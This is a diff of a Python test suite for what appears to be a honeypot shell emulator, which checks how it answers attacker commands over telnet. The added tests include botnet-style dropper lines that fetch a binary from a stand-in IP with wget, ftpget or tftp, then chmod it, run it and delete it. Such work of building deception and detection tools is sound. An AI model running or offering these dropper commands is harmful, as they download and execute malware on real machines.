@@ -220,9 +220,13 @@ def test_short_circuit_follows_exit_status(line, expected):
 
 def test_a_part_we_cannot_evaluate_does_not_lose_the_rest():
     # answer() still refuses the whole line (the model path); reply() answers part by part
-    assert shell.answer(host(), "uname -m; frobnicate; uname -s", now=NOW) is None
-    assert one("uname -m; frobnicate; uname -s") == \
+    assert shell.answer(host(), "uname -m; sort /etc/hostname; uname -s", now=NOW) is None
+    assert one("uname -m; sort /etc/hostname; uname -s") == "x86_64\nLinux\n"
+    # a word no program on the host answers to is bash's own error, on either path
+    a = shell.answer(host(), "uname -m; frobnicate; uname -s", now=NOW)
+    assert a.output == one("uname -m; frobnicate; uname -s") == \
         "x86_64\n-bash: frobnicate: command not found\nLinux\n"
+    assert a.scope == shell.SESSION
     assert one("ls --color /tmp; echo after") == "after\n"
     assert one("ls /tmp/*; echo after") == ""      # a glob: the whole line needs a shell
 
@@ -325,7 +329,7 @@ def test_mkdir_mv_touch_and_cd_stay_consistent():
 
 def test_files_are_only_made_where_a_listing_is_known():
     assert shell.answer(host(), "echo x > /etc/motd", now=NOW) is None
-    assert shell.answer(host(), "cp /bin/echo /etc/x", now=NOW) is None
+    assert shell.answer(host(), "cp /bin/echo /etc/xy", now=NOW) is None
     assert shell.answer(host(), "rm /etc/passwd", now=NOW) is None
     a = shell.answer(host(), "echo x > /tmp/f", user="alice", now=NOW)
     assert a is not None and a.output == ""
@@ -676,6 +680,39 @@ def test_a_whole_loader_probe_is_answered_without_the_model():
     replies = run([PROBE.format(d=d) for d in dirs], session=session)
     assert replies == ["-bash: /data/.f: No such file or directory\n" if d == "/data" else ""
                        for d in dirs]
+
+
+PLAIN = ">{d}/d && chmod 777 {d}/d && {d}/d && cd {d}/"
+
+
+def test_the_probe_with_a_one_character_name_in_a_system_directory():
+    """A one-character name is never one of the host's own entries in a system directory,
+    so the file is made there; a listing of the whole directory stays with the model."""
+    for d in ("/var", "/dev", "/etc", "/usr", "/var/run"):
+        session = shell.Session(cwd="/root")
+        a = shell.answer(host(), PLAIN.format(d=d), now=NOW, session=session)
+        assert (a.output, a.status, a.scope) == ("", 0, shell.STATE), d
+        assert session.cwd == d
+        assert run([f"ls -la {d}/d", f"cat {d}/d", f"{d}/d && echo ran", f"rm {d}/d",
+                    f"ls -la {d}/d"], session=session) == [
+            f"-rwxrwxrwx 1 root root 0 Nov 18 11:06 {d}/d\n", "", "ran\n", "",
+            f"ls: cannot access '{d}/d': No such file or directory\n"], d
+        assert shell.answer(host(), f"ls {d}", now=NOW, session=session) is None
+    # longer plain names may be the host's own: those stay with the model
+    for line in (">/var/cache", ">/etc/xy", ">/dev/fd", ">/usr/src", ">/proc/d", ">/sys/d"):
+        assert shell.answer(host(), line, now=NOW) is None, line
+
+
+def test_the_whole_probe_with_plain_names_is_answered_without_the_model():
+    dirs = ("/var", "/var/tmp", "/var/run", "/dev", "/dev/shm", "/data", "/etc", "/mnt", "/usr",
+            "/boot", "/home", "/root", "/tmp")
+    session = shell.Session(cwd="/root")
+    for d in dirs:
+        a = shell.answer(host(), PLAIN.format(d=d), now=NOW, session=session)
+        assert a is not None, d
+        assert a.output == ("-bash: /data/d: No such file or directory\n" if d == "/data"
+                            else ""), d
+    assert session.cwd == "/tmp" and "/run/d" in session.files
 
 
 def test_a_redirection_into_a_missing_directory_fails_as_bash_says():
@@ -1292,3 +1329,177 @@ def test_the_fallback_follows_the_model_after_the_model_answers_again():
     finally:
         hooks.session_close(sid, None)
     assert sid not in hooks._shell_stale
+
+
+# ---- empty lines, unknown words, /proc/self/cmdline, ( ) groups and loader droppers -----------
+
+ADDR = "198.51.100.23"
+DROPPERS = [
+    f"(wget http://{ADDR}/w -O- || busybox wget http://{ADDR}/w -O-) > w; chmod 777 w; ./w; "
+    "rm -rf w",
+    f"(ftpget {ADDR} f fg || busybox ftpget {ADDR} f fg) > f; chmod 777 f; ./f; rm -rf f",
+]
+TFTP_DROPPER = (f"(tftp -g {ADDR} -r t -l- || busybox tftp -g {ADDR} -r t -l-) > t; chmod 777 t; "
+                "./t; rm -rf t")
+
+
+def test_an_empty_line_is_a_bare_prompt():
+    for line in ("", "   ", "\t"):
+        a = shell.answer(host(), line, now=NOW)
+        assert (a.output, a.status, a.scope, a.shareable) == ("", 0, shell.FIXED, True)
+
+
+def test_any_word_no_program_answers_to_is_command_not_found():
+    for word in ("enablelinuxshell", "linuxshell", "system", "shell", "enablexyzshell",
+                 "frobnicate"):
+        a = shell.answer(host(), word, now=NOW)
+        assert (a.output, a.status, a.scope) == \
+            (f"-bash: {word}: command not found\n", 127, shell.SESSION)
+    assert shell.answer(host(), "frobnicate", interactive=False, now=NOW).output == \
+        "bash: line 1: frobnicate: command not found\n"
+    rhel = host(os_name="Rocky Linux 9.4 (Blue Onyx)")
+    assert one("busybox", rhel) == "-bash: busybox: command not found\n"
+    # another distribution's package manager does not exist here
+    assert one("yum") == "-bash: yum: command not found\n"
+    assert one("dnf") == "-bash: dnf: command not found\n"
+    assert one("apt", rhel) == "-bash: apt: command not found\n"
+    # an alias, an assignment, a builtin we do not evaluate, a program the host has, one
+    # its ps shows running
+    for line in ("ll", "la", "FOO=1", "exit 3", "sort /etc/hostname", "python3 -V", "else",
+                 "]]", "cron", "rsyslogd", "dbus-daemon"):
+        assert shell.answer(host(), line, now=NOW) is None, line
+    # programs a working server very often has stay with the model
+    for line in ("ss -tlnp", "journalctl -xe", "vim", "lsb_release -a", "docker ps", "pkill x",
+                 "git", "htop", "python"):
+        assert shell.answer(host(), line, now=NOW) is None, line
+    # a program the session put in the PATH is found
+    session = shell.Session(cwd="/root")
+    run(["cp /bin/echo /usr/local/bin/frob"], session=session)
+    assert "/usr/local/bin/frob" in session.files
+    assert shell.answer(host(), "frob", now=NOW, session=session) is None
+
+
+def test_proc_self_cmdline_is_the_reading_programs_arguments():
+    assert wire(one("cat /proc/self/cmdline")) == b"cat\x00/proc/self/cmdline\x00"
+    session = shell.Session(cwd="/root")
+    assert wire(run(["cd /proc && cat self/cmdline"], session=session)[0]) == \
+        b"cat\x00self/cmdline\x00"
+    assert wire(one("/bin/busybox cat /proc/self/cmdline")) == \
+        b"/bin/busybox\x00cat\x00/proc/self/cmdline\x00"
+    assert one("cat /proc/self/cmdline | wc -c") == "23\n"
+    a = shell.answer(host(), "cat /proc/self/cmdline", now=NOW)
+    assert a.scope == shell.FIXED and a.shareable
+    # the shell itself reading it is a login shell's argv, left to the model
+    assert shell.answer(host(), "read x < /proc/self/cmdline", now=NOW) is None
+
+
+def test_the_droppers_fetch_nothing_and_leave_an_empty_file():
+    session = shell.Session(cwd="/root")
+    wget, ftpget = run(DROPPERS, session=session)
+    assert wget == (f"--2026-11-18 11:06:40--  http://{ADDR}/w\n"
+                    f"Connecting to {ADDR}:80... failed: Network is unreachable.\n"
+                    f"Connecting to {ADDR}:80 ({ADDR}:80)\n"
+                    f"wget: can't connect to remote host ({ADDR}): Network is unreachable\n")
+    assert ftpget == ("-bash: ftpget: command not found\n"
+                      f"ftpget: can't connect to remote host ({ADDR}): Network is unreachable\n")
+    assert not session.files and session.cwd == "/root"
+    # each step on its own: the file is made empty, and an empty file runs as an empty script
+    assert run([DROPPERS[0].split(";")[0], "ls -la w", "chmod 777 w; ./w; echo $?"],
+               session=session)[1:] == ["-rw-r--r-- 1 root root 0 Nov 18 11:06 w\n", ""]
+    for line in DROPPERS:
+        a = shell.answer(host(), line, now=NOW)
+        assert a is not None and a.scope == shell.STATE and a.status == 0
+    assert not shell.answer(host(), DROPPERS[0], now=NOW).shareable     # wget's clock
+    assert one("busybox ftpget no.such.host f fg") == "ftpget: bad address 'no.such.host'\n"
+    # tftp clients differ in what they print for busybox's options: left to the model, and
+    # without one the transfer still fails
+    assert shell.answer(host(), TFTP_DROPPER, now=NOW) is None
+    assert shell.answer(host(), f"busybox tftp -g {ADDR} -r t -l-", now=NOW) is None
+    assert one(f"busybox tftp -g {ADDR} -r t -l t && echo ran") == "Transfer timed out.\n\n"
+    assert one(f"tftp -g {ADDR} -r t -l t || echo failed") == "Transfer timed out.\n\nfailed\n"
+
+
+def test_a_group_runs_as_a_subshell():
+    session = shell.Session(cwd="/root")
+    assert run(["(cd /tmp; pwd); pwd", "(busybox X; echo a) 2>e; cat e",
+                "(echo a; busybox X) >o; cat o", "( (echo a) ) | wc -c"], session=session) == \
+        ["/tmp\n/root\n", "a\nX: applet not found\n", "X: applet not found\na\n", "2\n"]
+    # stdout and stderr on one terminal in an order this shell cannot keep: the model's
+    assert shell.answer(host(), "(echo a; busybox X)", now=NOW) is None
+    for line in ("((echo a))", "(echo a) b", "echo a(b", "(echo a", "echo a)", "( )",
+                 ">f (echo a)", "echo a | (cat)", "(" * 5 + "echo a" + ")" * 5):
+        assert shell.answer(host(), line, now=NOW) is None, line
+
+
+# as the checks send them: each quote inside the script closed and reopened as '"'"'
+SSH_CHECKS = [
+    "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'chk_0f1e2d3c_control'\"'\"' "
+    "'\"'\"'chk_0f1e2d3c'\"'\"''",
+    "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'chk_0f1e2d3c_math'\"'\"' \"$((211*7+3))\"'",
+    "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'chk_0f1e2d3c_pid'\"'\"' \"$$\"'",
+    "sh -c 'set -- '\"'\"'chk_a1'\"'\"' '\"'\"'chk_a2'\"'\"'; printf '\"'\"'\\n%s|%s\\n'\"'\"' "
+    "'\"'\"'chk_pos'\"'\"' \"$#|$1|$2\"'",
+    "sh -c 'f_chk() { printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'chk_fn'\"'\"' \"$1|$#\"; }; "
+    "f_chk '\"'\"'chk_v'\"'\"''",
+    "sh -c 'printf '\"'\"'\\n%s\\n'\"'\"' '\"'\"'chk_done'\"'\"''",
+]
+
+
+async def test_each_family_end_to_end_through_the_telnet_listener():
+    lines = ["", "enablexyzshell", PLAIN.format(d="/var"), "ls -la /var/d",
+             "cd /proc && cat self/cmdline", "cat /proc/self/cmdline"] + SSH_CHECKS \
+        + ["cd /root"] + DROPPERS
+    events = EventWriter(None)
+    ctx = ListenerContext(events, bind_host="127.0.0.1", seed="test")
+    ctx.settings["telnet"] = ServiceSettings(name="telnet", enabled=True, port=0,
+                                             policy=LoginPolicy(accept="all"))
+    reader = asyncio.StreamReader()
+    reader.feed_data("".join(line + "\r\n" for line in lines).encode())
+    reader.feed_eof()
+    writer = FakeWriter()
+    conn = Conn(ctx, "telnet", reader, writer)
+    try:
+        await telnet._canned_session(conn, telnet.TelnetReader(conn), "root")
+    except Exception as exc:                       # the fake connection ends with EOF
+        assert type(exc).__name__ == "ConnClosed"
+    sent = writer.writes
+    at = [i for i, w in enumerate(sent) if w.startswith(b"root@srv01:")]
+    prompts = [sent[i] for i in at]
+    replies = [sent[i + 1] for i in at[:-1]]
+    assert len(replies) == len(lines)
+    assert replies[0] == b"" and replies[1] == b"-bash: enablexyzshell: command not found\r\n"
+    assert replies[2] == b"" and prompts[3] == b"root@srv01:/var# "
+    assert re.fullmatch(rb"-rwxrwxrwx 1 root root 0 \w{3} [ \d]\d \d\d:\d\d /var/d\r\n",
+                        replies[3])
+    assert replies[4] == b"cat\x00self/cmdline\x00" and prompts[5] == b"root@srv01:/proc# "
+    assert replies[5] == b"cat\x00/proc/self/cmdline\x00"
+    checks = replies[6:6 + len(SSH_CHECKS)]
+    assert checks[0] == b"\r\nchk_0f1e2d3c_control|chk_0f1e2d3c\r\n"
+    assert checks[1] == b"\r\nchk_0f1e2d3c_math|1480\r\n"
+    assert re.fullmatch(rb"\r\nchk_0f1e2d3c_pid\|[1-9]\d{3,6}\r\n", checks[2])
+    assert checks[3:] == [b"\r\nchk_pos|2|chk_a1|chk_a2\r\n", b"\r\nchk_fn|chk_v|1\r\n",
+                          b"\r\nchk_done\r\n"]
+    assert prompts[-1] == b"root@srv01:~# "
+    wget, ftpget = replies[-2:]
+    assert re.fullmatch(rb"--\d{4}-\d\d-\d\d \d\d:\d\d:\d\d--  http://198\.51\.100\.23/w\r\n"
+                        rb"Connecting to 198\.51\.100\.23:80\.\.\. failed: Network is "
+                        rb"unreachable\.\r\nConnecting to 198\.51\.100\.23:80 "
+                        rb"\(198\.51\.100\.23:80\)\r\nwget: can't connect to remote host "
+                        rb"\(198\.51\.100\.23\): Network is unreachable\r\n", wget)
+    assert ftpget == (b"-bash: ftpget: command not found\r\nftpget: can't connect to remote "
+                      b"host (198.51.100.23): Network is unreachable\r\n")
+    logged = [e for e in events.events if e["event"] == "command"]
+    for e in logged:
+        response = e["data"]["response"]
+        assert all(c.isprintable() or c in "\r\n\t" for c in response)
+        json.dumps(e).encode("utf-8")
+
+
+def test_a_group_that_reads_the_file_it_writes_is_left_to_the_model():
+    assert shell.answer(host(), "(echo a; wc -c f) >f; cat f", now=NOW) is None
+    assert shell.answer(host(), "(echo a; (cat /tmp/f)) >/tmp/f", now=NOW) is None
+    assert one("(echo a; echo b) >/tmp/f; cat /tmp/f") == "a\nb\n"
+
+
+def test_a_nested_group_keeps_every_byte_on_its_way_to_a_file():
+    assert one("( (echo -ne '\\x00\\x01a') ) >/tmp/f; wc -c /tmp/f") == "3 /tmp/f\n"
